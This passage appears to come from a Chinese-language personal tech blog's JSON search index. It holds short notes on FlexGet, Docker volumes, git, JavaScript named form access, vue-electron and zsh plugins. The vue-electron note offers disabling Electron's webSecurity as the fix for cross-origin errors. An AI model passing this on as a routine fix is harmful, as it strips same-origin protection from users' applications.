&quot;&apos;季度全集&apos; in category&quot;: reject</span><br><span class=\"line\">  autoPass:</span><br><span class=\"line\">    transmission:</span><br><span class=\"line\">      host: localhost</span><br><span class=\"line\">      port: 9091</span><br><span class=\"line\">      username: username</span><br><span class=\"line\">      password: usernamepassword</span><br><span class=\"line\">      addpaused: yes</span><br><span class=\"line\">      path: /mnt/extHDD/Download/Mikata/201707/&#123;&#123;task&#125;&#125;</span><br><span class=\"line\">    if:</span><br><span class=\"line\">      - &quot;&apos;季度全集&apos; in category&quot;: reject</span><br><span class=\"line\"></span><br><span class=\"line\">tasks:</span><br><span class=\"line\">  Fate/Apocrypha:</span><br><span class=\"line\">    rss:</span><br><span class=\"line\">      url: https://share.dmhy.org/topics/rss/sort_id/2/rss.xml?keyword=Apocrypha+team_id%3A37+720+繁</span><br><span class=\"line\">      other_fields: [category]</span><br><span class=\"line\">    accept_all: yes</span><br><span class=\"line\">    template: default</span><br></pre></td></tr></table></figure></p>\n<p>參考來源：<br><a href=\"https://stackoverflow.com/questions/19548957/can-i-force-pip-to-reinstall-the-current-version\" target=\"_blank\" rel=\"noopener\">python - Can I force pip to reinstall the current version? - Stack Overflow</a><br><a href=\"https://flexget.com/Plugins/disable\" target=\"_blank\" rel=\"noopener\">FlexGet</a><br><a href=\"https://flexget.com/Upgrade\" target=\"_blank\" rel=\"noopener\">FlexGet</a><br><a href=\"https://discuss.flexget.com/t/solved-flexget-cant-see-transmissionrpc-is-installed/2508\" target=\"_blank\" rel=\"noopener\">[SOLVED] Flexget can’t see Transmissionrpc is installed - help - Forum - FlexGet</a></p>\n","categories":["Linux"],"tags":["Linux","flexget"]},{"title":"[Pietty]Vim不能貼上問題&換字體顏色","url":"/blog/2018/01/07/logdown/2018-01-07-pietty-vim-cant-put-up-a-problem/","content":"<p>自重Raspberry Pi 升級後<br>sudo vim  編輯不能右鍵貼上了<br><a href=\"https://unix.stackexchange.com/questions/110684/copy-paste-into-sshd-vim-from-local-windows-clipboard\" target=\"_blank\" rel=\"noopener\">Copy/paste into SSH’d VIM from local (Windows) clipboard - Unix &amp; Linux Stack Exchange</a></p>\n<p>藍色文字看不太到<br><a href=\"http://www.oldpa.tw/forum/forum.php?mod=viewthread&amp;tid=2186\" target=\"_blank\" rel=\"noopener\">(技巧分享)更改PieTTY字體顏色.讓眼睛更舒服？ - 102-14雲端班 - 老爹隨筆私塾 - 老爹隨筆</a></p>\n","categories":["Linux"],"tags":["vim","pietty"]},{"title":"Docker權限問題","url":"/blog/2018/01/14/logdown/2018-01-14-docker-permission-issues/","content":"<p>要做blog移轉，筆記先存檔…<br><a href=\"http://www.jdkhome.com/article/docker-%E5%AE%B9%E5%99%A8%E6%8C%82%E8%BD%BD%E7%9B%AE%E5%BD%95%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98\" target=\"_blank\" rel=\"noopener\">docker 容器挂载目录权限问题</a><br><a href=\"https://stackoverflow.com/questions/34357252/docker-data-volume-vs-mounted-host-directory\" target=\"_blank\" rel=\"noopener\">docker data volume vs mounted host directory - Stack Overflow</a></p>\n","categories":["Docker"],"tags":["Docker"]},{"title":"Docker排程","url":"/blog/2018/01/14/logdown/2018-01-14-docker-schedule/","content":"<p>要做blog移轉，筆記先存檔…</p>\n<p><a href=\"http://gaga5lala.logdown.com/posts/2016/12/21/run-crontab-with-environment-variables-in-docker\" target=\"_blank\" rel=\"noopener\">在 docker 中執行需要環境變數的 cron job « 少年沒帶腦</a><br><a href=\"https://kknews.cc/zh-tw/news/3mvvx6y.html\" target=\"_blank\" rel=\"noopener\">Python寫的Crontab替代品，支持Docker - 每日頭條</a><br><a href=\"https://jonathas.com/scheduling-tasks-with-cron-on-docker/\" target=\"_blank\" rel=\"noopener\">Scheduling tasks with cron on Docker – Jon Ribeiro</a><br><a href=\"http://blog.chengweichen.com/2015/11/synology-nas-x-docker-x-php-cli-cron-x.html\" target=\"_blank\" rel=\"noopener\">艦長，你有事嗎？: 在 Synology NAS 上用 docker 運行 php-cli</a></p>\n","categories":["Docker"],"tags":["Docker","排程"]},{"title":"Docker時間同步(校正)","url":"/blog/2018/01/14/logdown/2018-01-14-docker-time-synchronization-correction/","content":"<p>要做blog移轉，筆記先存檔…<br><a href=\"http://dockone.io/question/505\" target=\"_blank\" rel=\"noopener\">Docker容器时间同步问题 - DockOne.io</a></p>\n","categories":["Docker"],"tags":["Docker"]},{"title":"docker volume筆記","url":"/blog/2018/01/14/logdown/2018-01-14-docker-volume-notes/","content":"<p>上一篇，記錄使用Docker架設Minecraft-server<br>突中還發現Volume要怎麼使用，以前沒有用對方法<br>在些記錄一下</p>\n<a id=\"more\"></a>\n<h1 id=\"docker查詢掛載資訊\"><a href=\"#docker查詢掛載資訊\" class=\"headerlink\" title=\"docker查詢掛載資訊\"></a>docker查詢掛載資訊</h1><p>一般使用volumes<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d -P -v /usr/local/apache2/htdocs  httpd</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker inspect -f &apos;&#123;&#123;.Mounts&#125;&#125;&apos; container_id</span><br></pre></td></tr></table></figure>\n<p>查詢volumes目錄路徑<br>之前我以為覆製檔案只能用<code>docker cp</code><br>現在不用煩腦怎麼覆製</p>\n<p>但我還有一個遺問<br>怎麼知道container workdir路徑是什麼</p>\n<h1 id=\"Docker-image-WorkDir-目錄\"><a href=\"#Docker-image-WorkDir-目錄\" class=\"headerlink\" title=\"Docker image WorkDir 目錄\"></a>Docker image WorkDir 目錄</h1><p>常常不知道，image 預設啟動目錄在哪裡，又要跑去翻文件<br>有時候想直接看到…，這時候下這個指令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker image inspect httpd</span><br></pre></td></tr></table></figure>\n<p>可以看到WorkingDir路徑</p>\n<h1 id=\"Docker-掛載常見寫法差別\"><a href=\"#Docker-掛載常見寫法差別\" class=\"headerlink\" title=\"Docker 掛載常見寫法差別\"></a>Docker 掛載常見寫法差別</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -P -d -v /usr/local/apache2/htdocs httpd</span><br></pre></td></tr></table></figure>\n<p>和<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -P -d -v /usr/local/apache2/htdocs:/usr/local/apache2/htdocs httpd</span><br></pre></td></tr></table></figure></p>\n<p>這個一樣</p>\n<p>今天發現原來是不一樣的東西，<br>原本爬文找有沒有第一次volumes時候把image東西copy出來<br><code>docker run -P -d -v /usr/local/apache2/htdocs httpd</code> 這個指令就是做這個動作<br>只不過volume存在<code>docker inspect musing_hopper | grep volume</code><br>可以看到存在位置，所以<code>/usr/local/apache2/htdocs</code>是指container path</p>\n<h1 id=\"Docker-volumes-路徑\"><a href=\"#Docker-volumes-路徑\" class=\"headerlink\" title=\"Docker volumes 路徑\"></a>Docker volumes 路徑</h1><p>docker volumes 存在位置在<code>/var/lib/docker/volumes</code>需要有root權限才能進去</p>\n<p>docker rm 並不會刪除volumes檔<br>想一次刪掉container跟volume嗎?<br>只要下這個指令<code>docker rm -v container_id</code><br>就能玩成目地了</p>\n<h1 id=\"Docker-快速刪除\"><a href=\"#Docker-快速刪除\" class=\"headerlink\" title=\"Docker 快速刪除\"></a>Docker 快速刪除</h1><p>又看到更外速刪除container,volume方法<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker container prune</span><br><span class=\"line\">or</span><br><span class=\"line\">docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure></p>\n<p>這個刪除volume也會把link清掉<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker rm -lv CONTAINER</span><br></pre></td></tr></table></figure></p>\n<p>更多內容在<a href=\"https://segmentfault.com/q/1010000010367238\" target=\"_blank\" rel=\"noopener\">docker容器删除了，link怎么还在？ - SegmentFault</a>裡面</p>\n<p>先記錄到這邊，感覺link也需要好好筆記<br>我竟然不知道要清除link這個東西，以為他會自動消失(汗)</p>\n<p>題外話：<br><a href=\"http://julianchu.net/2016/04/19-docker.html\" target=\"_blank\" rel=\"noopener\">Docker volume 簡單用法 | 只放拖鞋的鞋櫃</a><br><a href=\"https://nathanleclaire.com/blog/2014/07/12/10-docker-tips-and-tricks-that-will-make-you-sing-a-whale-song-of-joy/\" target=\"_blank\" rel=\"noopener\">10 Docker Tips and Tricks That Will Make You Sing A Whale Song of Joy | I care, I share, I’m Nathan LeClaire.</a><br><a href=\"https://gist.github.com/anildigital/862675ec1b7bccabc311\" target=\"_blank\" rel=\"noopener\">Remove dangling docker images</a><br><a href=\"http://blog.maxkit.com.tw/2017/02/dockerfile.html\" target=\"_blank\" rel=\"noopener\">Maxkit: Dockerfile 初步閱讀與學習紀錄</a><br><a href=\"https://yq.aliyun.com/articles/55912\" target=\"_blank\" rel=\"noopener\">深入理解docker的link机制-博客-云栖社区-阿里云</a><br><a href=\"http://note.qidong.name/2017/06/26/docker-clean/\" target=\"_blank\" rel=\"noopener\">清理Docker的container，image与volume · 零壹軒·笔记</a><br><a href=\"https://segmentfault.com/q/1010000010367238\" target=\"_blank\" rel=\"noopener\">docker容器删除了，link怎么还在？ - SegmentFault</a></p>\n","categories":["Docker"],"tags":["Docker","volume"]},{"title":"git建立空分支","url":"/blog/2017/12/23/logdown/2017-12-23-git-establishes-an-empty-branch/","content":"<p>今天看到git網路上寫的，發現它可以建立新空分支。<br>因為不常使用，在此筆記XD</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">git checkout --orphan gh-pages //建立一個沒有parent的branch，並移到該branch上</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://code.kpman.cc/2013/05/18/%E5%BB%BA%E7%AB%8B%E8%87%AA%E5%B7%B1%E7%9A%84github-project-pages/\" target=\"_blank\" rel=\"noopener\">建立自己的GitHub Project Pages | kpman | code</a><br><a href=\"https://segmentfault.com/a/1190000004931751\" target=\"_blank\" rel=\"noopener\">在GIT中创建一个空分支 - Min的专栏 - SegmentFault</a></p>\n","categories":["Git"],"tags":["git","branch"]},{"title":"有關GET POST 傳輸內容","url":"/blog/2018/01/15/logdown/2018-01-15-4769997/","content":"<p>一直以來我以為GET POST都有長度限制…<br>但看了下面文章，發現不是這一回事…<br>本來要做實驗，最近要做blog搬移<br>有空再寫一篇文章</p>\n<p><a href=\"https://blog.toright.com/posts/1203/%E6%B7%BA%E8%AB%87-http-method%EF%BC%9A%E8%A1%A8%E5%96%AE%E4%B8%AD%E7%9A%84-get-%E8%88%87-post-%E6%9C%89%E4%BB%80%E9%BA%BC%E5%B7%AE%E5%88%A5%EF%BC%9F.html\" target=\"_blank\" rel=\"noopener\">淺談 HTTP Method：表單中的 GET 與 POST 有什麼差別？ - Soul &amp; Shell Blog</a><br><a href=\"https://www.jianshu.com/p/512389822f8b\" target=\"_blank\" rel=\"noopener\">【HTTP】GET传参最大长度的理解误区 - 简书</a><br><a href=\"https://read01.com/zh-tw/ozD3PK.html\" target=\"_blank\" rel=\"noopener\">圖解HTTPS、GET和POST - 壹讀</a></p>\n"},{"title":"[JS]為什麼能用document.form1.username呢?","url":"/blog/2018/01/15/logdown/2018-01-15-4769676/","content":"<p>為什麼能用document.form1.username這個東西?</p>\n<p>這個困擾我很久…，在這公司這幾年<br>常常看到舊的code，從不解用成習慣<br>同事也不知道為什麼，古早人都是這樣寫<br>之前有找，但沒有找到相關資訊…<br>今天花一些時間找到資料，終於找到為什麼</p>\n<p>平常見網路教使用<code>document.form1.elements[&#39;username&#39;]</code>或<code>document.forms[&#39;form1&#39;].elements[&#39;uername&#39;]</code>.<br>公司常見寫法<code>document.form1.username</code>，只知道form1是用name不是用id去命名的<br>一直思考到今日，我又繼續查</p>\n<a id=\"more\"></a>\n<h1 id=\"JavaScript-Properties\"><a href=\"#JavaScript-Properties\" class=\"headerlink\" title=\"JavaScript Properties\"></a>JavaScript Properties</h1><p>今天爬到<a href=\"https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Guide/Working_with_Objects#%E7%B5%A6%E7%89%A9%E4%BB%B6%E5%B1%AC%E4%BB%B6%E7%B7%A8%E7%B4%A2%E5%BC%95\" target=\"_blank\" rel=\"noopener\">物件的使用 - JavaScript | MDN</a>這篇</p>\n<blockquote>\n<p>The exception to this rule is objects reflected from HTML, such as the forms array. You can always refer to objects in these arrays by either their ordinal number (based on where they appear in the document) or their name (if defined). For example, if the second <form> tag in a document has a NAME attribute of “myForm”, you can refer to the form as document.forms[1] or document.forms[“myForm”] or document.myForm.</form></p>\n</blockquote>\n<p>當下嘗試寫下面code<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">var a = [];</span><br><span class=\"line\">a[&apos;length&apos;];</span><br><span class=\"line\">//return 0</span><br><span class=\"line\">//常見的a.length</span><br></pre></td></tr></table></figure></p>\n<p>竟然能work</p>\n<p>看到這篇我晃然大悟…</p>\n<h2 id=\"今天我終於還債了，開心-D\"><a href=\"#今天我終於還債了，開心-D\" class=\"headerlink\" title=\"今天我終於還債了，開心:D\"></a>今天我終於還債了，開心:D</h2><h3 id=\"簡單深入了解\"><a href=\"#簡單深入了解\" class=\"headerlink\" title=\"簡單深入了解\"></a>簡單深入了解</h3><p><code>document.forms</code>傳回<a href=\"https://developer.mozilla.org/zh-TW/docs/Web/API/HTMLCollection\" target=\"_blank\" rel=\"noopener\">HTMLCollection</a>東西<br>HTMLCollection在W3C文件可以看見</p>\n<blockquote>\n<p>element = collection[name]<br>    Returns the first element with ID or name name from the collection.</p>\n</blockquote>\n<p><a href=\"https://dom.spec.whatwg.org/#htmlcollection\" target=\"_blank\" rel=\"noopener\">DOM Standard</a></p>\n<p>所以<code>document.forms.(name)</code>跟<code>document.forms.(id)</code>都可以抓到</p>\n<p>做到這邊我發現怪怪的…<br><code>document.(form1)</code>怎麼可以抓到name，但不能抓到ID<br>不過先排除HTMLCollection一樣問題</p>\n<p>直接找W3C文件Document文件<a href=\"https://html.spec.whatwg.org/multipage/dom.html#dom-document-nameditem-filter\" target=\"_blank\" rel=\"noopener\">Named elements</a></p>\n<blockquote>\n<ol>\n<li>Exposed embed, form, iframe, img, or exposed object elements that have a name content attribute whose value is name, or</li>\n</ol>\n</blockquote>\n<blockquote>\n<ol start=\"2\">\n<li>Exposed object elements that have an id content attribute whose value is name, or</li>\n</ol>\n</blockquote>\n<blockquote>\n<ol start=\"3\">\n<li>img elements that have an id content attribute whose value is name, and that have a non-empty name content attribute present also.</li>\n</ol>\n</blockquote>\n<blockquote>\n<ol start=\"4\">\n<li>An embed or object element is said to be exposed if it has no exposed object ancestor, and, for object elements, is additionally either not showing its fallback content or has no object or embed descendants.</li>\n</ol>\n</blockquote>\n<p>看了文件驚呆了，原來不是只有name會抓，object的id也會抓，還有img有id跟name的時候，才會在<code>document.(id)</code>出現<br><em>WTF</em>這什麼鬼?! 不過文件規定是這樣應該就沒錯了…，不知道這樣設計是運用在什麼地方<br>至少不會再踩到雷了吧XD</p>\n<p>再來是Form文件<a href=\"https://html.spec.whatwg.org/multipage/forms.html#dom-form-nameditem\" target=\"_blank\" rel=\"noopener\">HTML Standard</a><br>id跟name都能吃到，詳細就自己去看</p>\n<h3 id=\"20180124-發現window也跟document一樣有帶有屬性-HTMLCollection\"><a href=\"#20180124-發現window也跟document一樣有帶有屬性-HTMLCollection\" class=\"headerlink\" title=\"20180124 發現window也跟document一樣有帶有屬性[HTMLCollection]\"></a>20180124 發現window也跟document一樣有帶有<code>屬性</code>[HTMLCollection]</h3><p>難怪平常看到form1，可以正常跑，是因為抓到<code>window</code>變數<br>突然恍然大悟，window.(id)可以抓到我設定的<input id=\"(id)\"></p>\n<hr>\n<h2 id=\"BTW\"><a href=\"#BTW\" class=\"headerlink\" title=\"BTW\"></a>BTW</h2><p>其實找超久的，原本從MDN裡的document,form手冊看<br>沒有看到我要的，我又從W3C找有沒有相關內容<br>結果還是沒有…，不過好在爬到MDN<a href=\"https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Guide/Working_with_Objects#%E7%B5%A6%E7%89%A9%E4%BB%B6%E5%B1%AC%E4%BB%B6%E7%B7%A8%E7%B4%A2%E5%BC%95\" target=\"_blank\" rel=\"noopener\">物件的使用 - JavaScript | MDN</a>這篇<br>為什麼許多教學文不會教<code>document.form1.username</code>?</p>\n<h3 id=\"因為這都是JavaScript裡基礎的東西\"><a href=\"#因為這都是JavaScript裡基礎的東西\" class=\"headerlink\" title=\"因為這都是JavaScript裡基礎的東西\"></a>因為這都是JavaScript裡基礎的東西</h3><p>看到都快要去跪鍵盤了orz</p>\n<p>參考來源：<br><a href=\"https://www.w3schools.com/js/js_properties.asp\" target=\"_blank\" rel=\"noopener\">JavaScript Properties</a><br><a href=\"https://developer.mozilla.org/zh-TW/docs/Web/API/HTMLCollection\" target=\"_blank\" rel=\"noopener\">HTMLCollection - Web APIs | MDN</a><br><a href=\"https://pjchender.blogspot.com/2015/11/javascript.html\" target=\"_blank\" rel=\"noopener\">[筆記]用javascript來取得表單元素內容的值(javascript取值) ~ PJCHENder<br>那些沒告訴你的小細節</a></p>\n","categories":["JavaScript"],"tags":["JavaScript"]},{"title":"vue-electron測試使用初體驗","url":"/blog/2018/01/20/logdown/2018-01-20-5134612/","content":"<p>最近剛好看到vue-electron<br>剛好手頭想做一個桌面程式<br>就想嘗試看看</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装 vue-cli 和 脚手架样板代码</span></span><br><span class=\"line\">npm install -g vue-cli</span><br><span class=\"line\">vue init simulatedgreg/electron-vue my-project</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装依赖并运行你的程序</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> my-project</span><br><span class=\"line\">npm install</span><br><span class=\"line\">npm run dev</span><br></pre></td></tr></table></figure>\n<p>先不要安裝es-lint</p>\n<p>打開Visual Studio Code就可以改程式<br>而且存檔都會自動重新載入</p>\n<p>剛開始試著改程式，都沒辦法載入成功<br>後來是發現es-lint不要安裝<br>就不會有問題了</p>\n<p>連編譯exe設定都幫你設定好了<br>這真的太棒了<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm run build</span><br></pre></td></tr></table></figure></p>\n<p>目前有用簡單功能，有做ajax動作<br>爬文以後，有看到vue-electron內建有axios<br>axios可以使用ajax功能<br>跨網域預設還是會擋的<br>在<code>main/index.js</code>設定<code>webPreferences: { webSecurity: false }</code><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mainWindow = new BrowserWindow(&#123;</span><br><span class=\"line\">  height: 563,</span><br><span class=\"line\">  useContentSize: true,</span><br><span class=\"line\">  width: 1000,</span><br><span class=\"line\">  webPreferences: &#123; webSecurity: false &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>有做跨網域的問題就可以解決</p>\n<p>然後還可以做<code>熱更新</code><br>改日再研究<br><code>Auto Updater</code></p>\n<p>參考來源</p>\n<ul>\n<li><a href=\"https://simulatedgreg.gitbooks.io/electron-vue/content/cn/\" target=\"_blank\" rel=\"noopener\">简介 · electron-vue</a></li>\n<li><a href=\"https://www.google.com.tw/search?q=axios+cros&amp;client=firefox-b-ab&amp;dcr=0&amp;lr=lang_zh-TW&amp;sa=X&amp;ved=0ahUKEwir3NOl-ObYAhVIn5QKHUyYAmAQuAEIIw&amp;biw=1920&amp;bih=931\" target=\"_blank\" rel=\"noopener\">axios cros - Google 搜尋</a></li>\n<li><a href=\"https://tw.saowen.com/a/a2588e492571db42c9082c9a37ad5cf9b6b951627d58e00ded64ca18885c043a\" target=\"_blank\" rel=\"noopener\">vue cli+axios踩坑記錄+攔截器使用，代理跨域proxy - 掃文資訊</a></li>\n<li><a href=\"http://www.itread01.com/content/1499661488.html\" target=\"_blank\" rel=\"noopener\">vue結合axios使用入門 - IT閱讀</a></li>\n<li><a href=\"http://www.itread01.com/content/1508324169.html\" target=\"_blank\" rel=\"noopener\">vue 使用axios 跨域請求數據的問題 - IT閱讀</a></li>\n<li><a href=\"https://www.zhihu.com/question/35243347\" target=\"_blank\" rel=\"noopener\">如何获取前台input file中的文件上传路径？ - 知乎</a></li>\n<li><a href=\"https://simulatedgreg.gitbooks.io/electron-vue/content/en/using-electron-builder.html#auto-updating\" target=\"_blank\" rel=\"noopener\">Using electron-builder · electron-vue</a></li>\n<li><a href=\"https://www.electron.build/code-signing\" target=\"_blank\" rel=\"noopener\">Code Signing · electron-builder</a></li>\n</ul>\n","categories":["electron"]},{"title":"超級終端機 zplug","url":"/blog/2018/01/22/logdown/2018-01-22-5198665/","content":"<p><a href=\"https://medium.com/@shengyou/2018ironman-eos-for-php-developer-day11-dff7e9b47679\" target=\"_blank\" rel=\"noopener\">[2018 鐵人賽] 簡潔高效的 PHP &amp; Laravel 工作術：從 elementary OS 下手的聰明改造提案 #11</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">source ~/.zplug/init.zsh</span><br><span class=\"line\">#　TAB 補完選單</span><br><span class=\"line\">source ~/.zplug/completion.zsh</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">export DEFAULT_USER=`whoami`</span><br><span class=\"line\"></span><br><span class=\"line\">POWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(dir newline vcs)</span><br><span class=\"line\">zplug &quot;bhilburn/powerlevel9k&quot;, use:powerlevel9k.zsh-theme</span><br><span class=\"line\"></span><br><span class=\"line\"># 排序安裝</span><br><span class=\"line\">zplug &quot;zsh-users/zsh-syntax-highlighting&quot;, defer:2</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 從 Github 安裝</span><br><span class=\"line\">zplug &quot;zsh-users/zsh-history-substring-search&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 從 on-my-zsh 安裝</span><br><span class=\"line\">zplug &quot;plugins/git&quot;, from:oh-my-zsh</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 依作業系統載入</span><br><span class=\"line\">zplug &quot;lib/clipboard&quot;, from:oh-my-zsh, if:&quot;[[ $OSTYPE == *darwin* ]]&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#docker compose</span><br><span class=\"line\">zplug &quot;plugins/docker-compose&quot;, from:oh-my-zsh</span><br><span class=\"line\"></span><br><span class=\"line\">zplug &quot;b4b4r07/enhancd&quot;, use:init.sh</span><br><span class=\"line\"></span><br><span class=\"line\">zplug &quot;tarrasch/zsh-bd&quot;, at:3724233, frozen:1</span><br><span class=\"line\"></span><br><span class=\"line\">zplug &quot;jhawthorn/fzy&quot;, \\</span><br><span class=\"line\">    as:command, \\</span><br><span class=\"line\">    rename-to:fzy, \\</span><br><span class=\"line\">    hook-build:&quot;</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        make</span><br><span class=\"line\">        sudo make install</span><br><span class=\"line\">    &#125; &amp;&gt;/dev/null</span><br><span class=\"line\">    &quot;</span><br><span class=\"line\"></span><br><span class=\"line\">zplug &quot;junegunn/fzf-bin&quot;, as:command, from:gh-r, rename-to:fzf</span><br><span class=\"line\"></span><br><span class=\"line\"># ついでに tmux 用の拡張も入れるといい</span><br><span class=\"line\">zplug &quot;junegunn/fzf&quot;, as:command, use:bin/fzf-tmux</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if ! zplug check --verbose; then</span><br><span class=\"line\">    printf &quot;Install? [y/N]: &quot;</span><br><span class=\"line\">    if read -q; then</span><br><span class=\"line\">        echo; zplug install</span><br><span class=\"line\">    fi</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#沒有用</span><br><span class=\"line\">#POWERLEVEL9K_MODE=&quot;Hack&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">zplug load</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"解決zplug-install-unknow-error\"><a href=\"#解決zplug-install-unknow-error\" class=\"headerlink\" title=\"解決zplug install unknow error\"></a>解決<code>zplug install</code> unknow error</h1><p>安裝gawk<br><code>sudo apt-get install gawk</code></p>\n","categories":["Linux"],"tags":["Linux","zsh","zplug"]},{"title":"超級終端機 fzf","url":"/blog/2018/01/22/logdown/2018-01-22-5198700/","content":"<p>感覺就是fzy的進階版<br>他可以多選<code>fzy -m</code>，按<code>tab</code>可做選擇動作<br>官網其中範例<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">find * -type f | fzf &gt; selected</span><br></pre></td></tr></table></figure></p>\n<p>其實還有滿多vim範例的<br>但我都不太熟 哈</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">fzf --preview &apos;cat &#123;&#125;&apos;</span><br></pre></td></tr></table></figure>\n<p>這個預覽工能也滿強大的XD</p>\n<p>參考來源：<br><a href=\"https://segmentfault.com/a/1190000011328080\" target=\"_blank\" rel=\"noopener\">模糊搜索神器fzf - 验证的进阶之路 - SegmentFault 思否</a><br><a href=\"https://github.com/junegunn/fzf\" target=\"_blank\" rel=\"noopener\">junegunn/fzf: A command-line fuzzy finder</a><br><a href=\"https://hk.saowen.com/a/119630d800b375b1e3186e8c19efac8b5e4d29b0e3b712d036ea3aa02ffbfc7f\" target=\"_blank\" rel=\"noopener\">模糊搜索神器fzf - 掃文資訊</a></p>\n","categories":["Linux"],"tags":["Linux","zsh","zplug"]},{"title":"超級終端機 bd","url":"/blog/2018/01/22/logdown/2018-01-22-super-terminal-bd/","content":"<p>常常因為要做<code>cd ../..</code>而煩腦嗎<br>發現有人介紹zplug其中一個套件 bd<br>這指令跟bd是相反的</p>\n<p>zplug 安裝方法<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">zplug &quot;tarrasch/zsh-bd&quot;, at:3724233, frozen:1</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://asciinema.org/a/9HZ5Pkigj34EvGUwQOshH5ddK\" target=\"_blank\" rel=\"noopener\"><img src=\"https://asciinema.org/a/9HZ5Pkigj34EvGUwQOshH5ddK.png\" alt=\"asciicast\"></a><br><a href=\"https://asciinema.org/a/9HZ5Pkigj34EvGUwQOshH5ddK\" target=\"_blank\" rel=\"noopener\">URL</a></p>\n","categories":["Linux"],"tags":["Linux","zsh","zplug"]},{"title":"超級終端機 指令補全","url":"/blog/2018/01/22/logdown/2018-01-22-super-terminal-command-completion/","content":"<p>oh-my-zsh有一個指令補全功能<br>再我裝zsh在elementary OS 上面少這個功能<br>就不太習慣XD</p>\n<p>好來我找到了</p>\n<p>在<a href=\"https://github.com/robbyrussell/oh-my-zsh/blob/master/lib/completion.zsh\" target=\"_blank\" rel=\"noopener\">oh-my-zsh/completion.zsh at master · robbyrussell/oh-my-zsh</a>抓下來(檔案抓下來，對照設定檔錄徑)<br>.zshrc設定<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#　TAB 補完選單</span><br><span class=\"line\">source ~/.zplug/completion.zsh</span><br></pre></td></tr></table></figure></p>\n<p>就能完成了</p>\n<p><img src=\"https://asciinema.org/a/kLj4j7cwjwsUnrIvTM3GZ9VtC.png\" alt=\"asciicast\"><br><a href=\"https://asciinema.org/a/kLj4j7cwjwsUnrIvTM3GZ9VtC\" target=\"_blank\" rel=\"noopener\">URL</a></p>\n<p><a href=\"https://github.com/robbyrussell/oh-my-zsh/blob/master/lib/completion.zsh\" target=\"_blank\" rel=\"noopener\">oh-my-zsh/completion.zsh at master · robbyrussell/oh-my-zsh</a><br><a href=\"https://asciinema.org/a/37390\" target=\"_blank\" rel=\"noopener\">Installing zsh-autosuggestions - asciinema</a></p>\n","categories":["Linux"],"tags":["Linux","zsh","zplug"]},{"title":"超級終端機 fzy","url":"/blog/2018/01/22/logdown/2018-01-22-super-terminal-fzy/","content":"<p>網路上看到fzy工具<br>感覺在選擇多個檔案會很有幫助<br><a id=\"more\"></a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">zplug &quot;jhawthorn/fzy&quot;, \\</span><br><span class=\"line\">    as:command, \\</span><br><span class=\"line\">    rename-to:fzy, \\</span><br><span class=\"line\">    hook-build:&quot;</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        make</span><br><span class=\"line\">        sudo make install</span><br><span class=\"line\">    &#125; &amp;&gt;/dev/null</span><br><span class=\"line\">    &quot;</span><br></pre></td></tr></table></figure>\n<pre><code>[![asciicast](https://asciinema.org/a/TNkbpJmduO878wMUsr6iyobxF.png)](https://asciinema.org/a/TNkbpJmduO878wMUsr6iyobxF)\n</code></pre>","categories":["Linux"],"tags":["Linux","zsh","zplug"]},{"title":"超級終端機 enhancd","url":"/blog/2018/01/22/logdown/2018-01-22-super-terminal-enhancd/","content":"<p>enhancd有點像sublime text功能一樣<br>可快速選到你要的檔案<br>但他好像是抓取你進去過的目錄<br>沒進去可能無法抓到</p>\n<p>用講的很難理解，看影片比較快XD<br><a href=\"https://asciinema.org/a/RPKiErqRYCGKIGfpDuvm0safe\" target=\"_blank\" rel=\"noopener\"><img src=\"https://asciinema.org/a/RPKiErqRYCGKIGfpDuvm0safe.png\" alt=\"asciicast\"></a><br><a href=\"https://asciinema.org/a/RPKiErqRYCGKIGfpDuvm0safe\" target=\"_blank\" rel=\"noopener\">URL</a></p>\n<p><a href=\"https://github.com/b4b4r07/enhancd\" 